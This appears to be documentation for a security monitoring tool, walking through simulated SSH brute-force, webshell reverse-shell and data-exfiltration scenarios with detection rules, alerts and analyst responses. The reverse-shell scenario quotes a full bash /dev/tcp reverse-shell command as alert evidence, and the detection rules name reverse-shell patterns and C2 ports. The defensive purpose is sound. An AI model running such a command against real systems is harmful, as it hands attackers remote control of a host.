# Attack Simulation Scenarios

Detailed walkthroughs demonstrating how SecurityScarletAI detects, analyzes, and responds to common attack patterns.

---

## Scenario 1: SSH Brute Force Attack

### Overview

An attacker launches a brute force SSH attack against the bastion host, attempting thousands of login combinations. After many failures, they find valid credentials and gain access.

### Step 1: Detection — Sigma Rule Fires

**Rule**: `SSH Brute Force Detected` (`rules/sigma/authentication/ssh_brute_force.yml`)

```yaml
title: SSH Brute Force Detected
level: high
tags:
  - attack.credential_access
  - attack.ta0006
  - attack.t1110
```

**What happens**: The detection engine counts failed SSH login events from the same source IP. When the count exceeds the threshold (>5 in 5 minutes), an alert is generated.

### Step 2: Alert Created

```json
{
  "rule_name": "SSH Brute Force Detected",
  "severity": "high",
  "host_name": "bastion-host-05",
  "description": "8 failed SSH login attempts from 203.0.113.50 within 5 minutes",
  "mitre_tactics": ["TA0006"],
  "mitre_techniques": ["T1110"],
  "evidence": [
    {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "root"},
    {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "admin"},
    ...
  ]
}
```

### Step 3: AI Explanation

The AI alert explanation engine generates a human-readable summary:

> **What happened**: 8 failed SSH login attempts were detected from source IP 203.0.113.50 targeting bastion-host-05 within a 5-minute window. Multiple usernames (root, admin, user) were targeted.
>
> **Why it matters**: This pattern is consistent with credential brute-force attacks (MITRE T1110). The attacker is likely using a dictionary of common usernames and passwords to gain initial access.
>
> **Next steps**: 1) Block source IP 203.0.113.50 at the firewall. 2) Check if any successful logins followed from this IP. 3) Review SSH key configurations on bastion-host-05. 4) Enable fail2ban with stricter thresholds.

### Step 4: ML Triage

The triage model evaluates the alert with 11 features:

| Feature | Value | Signal |
|---------|-------|--------|
| `severity_score` | 3.0 (high) | High severity |
| `source_ip_entropy` | 0.0 (single IP) | Low diversity — targeted attack |
| `has_threat_intel_match` | True | IP found in AbuseIPDB |
| `is_off_hours` | True | Attack at 3 AM |
| `event_count` | 8 | Multiple events |

**Prediction**: `True Positive` with 94% confidence — this alert should be prioritized for immediate investigation.

### Step 5: Risk Scoring

```
Risk Score: 85/100
├── Base severity (high): 40
├── Threat intel match (+15): 55
├── Asset criticality (bastion host): 70
└── Anomaly (off-hours pattern): 85
```

### Step 6: Correlation Detection

The **Brute Force → Successful Login** correlation rule detects that a successful SSH login from 203.0.113.50 followed the failed attempts. This creates a second, critical-severity alert:

```json
{
  "rule_name": "SSH Successful Login After Failures",
  "severity": "critical",
  "description": "Successful SSH login from 203.0.113.50 after multiple failures"
}
```

### Step 7: What the Dashboard Shows

- **Alerts page**: Two red critical alerts at the top, with severity badges and AI summaries
- **Real-time WebSocket**: New alert toast notification
- **Cases page**: Analyst can create a case linking both alerts, assign to the SOC team, and add investigation notes
- **Hunt page**: Suggested hunt: "Find all successful logins from 203.0.113.50"

### Step 8: Analyst Actions

From the dashboard, the analyst can:

1. **Create a case** — Group the brute force + successful login alerts
2. **Block the IP** — Via SOAR integration (`src/response/soar.py`), automatically add a pf firewall rule blocking 203.0.113.50
3. **Run a hunt** — Natural language query: "Show me all activity from 203.0.113.50 this week"
4. **Assign the case** — To the on-call analyst with a severity of `critical`
5. **Document lessons learned** — After resolution, add lessons learned to the case

---

## Scenario 2: Reverse Shell Detection

### Overview

An attacker exploits a web application vulnerability to upload a PHP webshell, then executes a reverse shell to establish a persistent connection back to their C2 server.

### Step 1: Detection — Multiple Rules Fire

**Rule 1**: `Webshell Creation` (severity: critical)

Detects PHP file creation in web-served directories:
```yaml
title: Webshell Creation
level: critical
detection:
  selection_web_dir:
    file_path|contains:
      - /var/www/
  selection_shell_content:
    file_path|endswith: .php
  condition: selection_web_dir and selection_shell_content
```

**Rule 2**: `Reverse Shell Pattern Detected` (severity: critical)

Detects common reverse shell patterns in command lines:
```yaml
title: Reverse Shell Pattern Detected
level: critical
detection:
  selection_bash_tcp:
    process_cmdline|contains: /dev/tcp
  condition: selection_bash_tcp or ... (7 patterns)
```

**Rule 3**: `Outbound Connection to Rare/C2 Port` (severity: high)

Detects outbound connections to port 4444 (known C2 port):
```yaml
title: Outbound Connection to Rare/C2 Port
level: high
detection:
  destination_port: [4444, 31337, 6667, ...]
```

### Step 2: Alerts Created

Three alerts fire in rapid succession:

| Alert | Severity | Host | Key Evidence |
|-------|----------|------|-------------|
| Webshell Creation | Critical | web-server-01 | `/var/www/html/shell.php` |
| Reverse Shell Pattern | Critical | web-server-01 | `bash -i >& /dev/tcp/203.0.113.50/4444` |
| Outbound Connection to C2 Port | High | web-server-01 | Port 4444 to 203.0.113.50 |

### Step 3: AI Explanation

For the reverse shell alert:

> **What happened**: A reverse shell was detected on web-server-01. The process `bash -i >& /dev/tcp/203.0.113.50/4444 0>&1` established an interactive bash session connecting back to external IP 203.0.113.50 on port 4444.
>
> **Why it matters**: This is a critical indicator of compromise (MITRE T1059). The attacker has gained remote shell access to the host, likely through a web application vulnerability. They now have full control of the system.
>
> **Next steps**: 1) Immediately isolate web-server-01 from the network. 2) Capture a forensic image. 3) Check the webshell for uploaded payloads. 4) Review web application logs for the initial compromise vector. 5) Search other hosts for similar activity.

### Step 4: ML Triage

| Feature | Value | Signal |
|---------|-------|--------|
| `severity_score` | 4.0 (critical) | Maximum severity |
| `has_threat_intel_match` | True | IP in C2 threat feed |
| `process_name_entropy` | 0.0 | Known suspicious command |
| `event_count` | 3 | Multiple correlated events |

**Prediction**: `True Positive` with 97% confidence.

### Step 5: Correlation

The **Dropped Payload → C2 Callback** correlation rule links the webshell creation with the outbound C2 connection:

```
Confidence: 85% (base 75% + bonus for threat intel match)
```

### Step 6: What the Dashboard Shows

- **Alerts page**: Three correlated alerts with a shared correlation chain
- **AI Chat**: Analyst asks "What attack chain does this represent?" and gets an explanation of the initial access → execution → C2 pattern
- **MITRE Coverage**: Alerts map to Initial Access, Execution, Command & Control, indicating a multi-stage attack

### Step 7: Analyst Actions

1. **Create a case**: "Reverse Shell on Web Server" — severity: critical
2. **Isolate the host**: SOAR playbook blocks web-server-01 at the network level
3. **Natural language query**: "Show me all processes launched from /var/www/ in the last 24 hours"
4. **Hunt from alert**: Pivot on 203.0.113.50 — "Find all connections to this IP"
5. **Document**: Record the compromise vector (webshell upload) and remediation steps

---

## Scenario 3: Data Exfiltration

### Overview

An insider or compromised account begins exfiltrating large volumes of data through the API gateway, first using bulk downloads and then switching to DNS tunneling when rate limits are applied.

### Step 1: Detection — Sigma Rules

**Rule 1**: `Data Exfiltration Volume` (severity: high)

Detects large outbound data transfers:
```yaml
title: Data Exfiltration Volume
level: high
tags:
  - attack.exfiltration
  - attack.ta0010
  - attack.t1048
```

**Rule 2**: `API Key Usage from New IP` (severity: medium)

Detects API key authentication from a new source:
```yaml
title: API Key Usage from New IP
level: medium
```

**Rule 3**: `DNS Tunneling Indicators` (severity: medium)

Detects DNS queries with suspiciously long subdomains:
```yaml
title: DNS Tunneling Indicators
level: medium
```

### Step 2: Alerts

| Alert | Severity | Host | Evidence |
|-------|----------|------|----------|
| Data Exfiltration Volume | High | api-gateway-03 | 2.3GB to 198.51.100.23 |
| API Key Usage from New IP | Medium | api-gateway-03 | Key used from 45.33.32.156 |
| DNS Tunneling Indicators | Medium | api-gateway-03 | Long subdomain queries |

### Step 3: AI Explanation

> **What happened**: Unusually large outbound data transfers (2.3GB) were detected from api-gateway-03 to external IP 198.51.100.23. Additionally, DNS tunneling indicators and API key usage from a new IP were detected on the same host.
>
> **Why it matters**: The combination of bulk data transfer and DNS tunneling suggests multi-channel exfiltration (MITRE T1048). The attacker may be using both direct download and DNS tunneling to bypass rate limits.
>
> **Next steps**: 1) Block external IP 198.51.100.23. 2) Revoke the API key associated with the new IP. 3) Query DNS logs for the suspicious domain. 4) Review data access logs for the past 7 days. 5) Check if the API key has been used for other exfiltration attempts.

### Step 4: Natural Language Query

The analyst asks the system:

**"Which user is sending the most data externally?"**

The NL→SQL engine converts this to a safe, parameterized query:

```sql
SELECT user_name, 
       SUM(COALESCE((enrichment->>'bytes_sent')::bigint, 0)) AS total_bytes,
       COUNT(*) AS connection_count
FROM logs 
WHERE event_category = 'network' 
  AND destination_ip IS NOT NULL
  AND time > NOW() - INTERVAL '24 hours'
GROUP BY user_name 
ORDER BY total_bytes DESC 
LIMIT 100
```

Results show `svc_deploy` accounted for 95% of all outbound data.

### Step 5: Hunting

The analyst opens the **Hunting** tab and sees suggested queries:

| Hunt | Category | Description |
|------|----------|-------------|
| Data Staging & Exfiltration | Exfiltration | Look for large file reads followed by network connections |
| API Key Anomalies | Initial Access | Find API key usage from new or unusual IPs |
| DNS Tunneling | C2 | Check for DNS queries with abnormally long subdomains |

They also run **MITRE Gap Analysis** and see that Exfiltration (TA0010) is well-covered, but Collection (TA0009) has fewer rules — suggesting they should add rules for data staging.

### Step 6: Correlation

The **Large Read → Large Network Transfer** correlation rule fires:

```
Confidence: 72% (base 65% + 7% for threat intel match on destination IP)
```

Linking the process read events with the network transfer events.

### Step 7: What the Dashboard Shows

- **Alerts**: Three linked alerts on api-gateway-03 with correlation badge
- **NL Query**: Interactive results showing top data exfiltrators by user and IP
- **Risk Score**: api-gateway-03 scores 78/100 (elevated due to threat intel match)
- **Cases**: Create a case linking all three alerts

### Step 8: Analyst Actions

1. **Revoke the API key**: Through the SOAR response module
2. **Block exfiltration IPs**: Add 198.51.100.23 and 45.33.32.156 to the firewall blocklist
3. **Hunt for collection patterns**: "Show me all large file reads by svc_deploy in the last week"
4. **Remediate**: Disable the compromised service account, rotate credentials
5. **Document lessons**: "Implemented API rate limiting and response size caps. API keys now require IP allowlisting. Added monitoring for bulk data access patterns."